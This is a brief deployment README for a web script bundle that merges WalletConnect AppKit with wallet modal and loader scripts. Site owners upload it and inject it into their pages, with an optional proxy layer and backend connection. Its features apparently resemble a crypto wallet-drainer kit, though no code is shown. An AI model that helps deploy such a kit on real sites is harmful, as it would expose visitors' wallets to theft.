# Deployment Instructions\n\nMode: Shared Host Compatible\nThis build skips ProxyGuard features to avoid filesystem writes and webhook calls. Suitable for shared hosting where outbound HTTPS or file writes are restricted.\n\n1. Upload the entire assets folder to your website root (same level as index.html).\n2. (No proxy.php needed - using direct backend connection)\n3. Add these scripts before </body>:\n   <script src="/assets/sources.js"></script>\n   <script src="/assets/polyfills__5002453574.js"></script>\n\nNote: sources.js contains modules.js (WalletConnect AppKit), w-modal.js, and w-loader.js merged together.\n\n4. (No proxy.php needed - backend connection is direct)\n5. Optimized for shared hosting (PHP + outbound HTTPS recommended). ProxyGuard is disabled in this build.\n\nMinimum Requirements:\n- PHP 7.3 or higher\n- PHP extensions: curl, json\n- Outbound HTTPS (port 443) access\n- Full Proxy mode: write access to /.proxy_guard\n\n6. Optional: upload and open health-check.php to verify the server configuration.
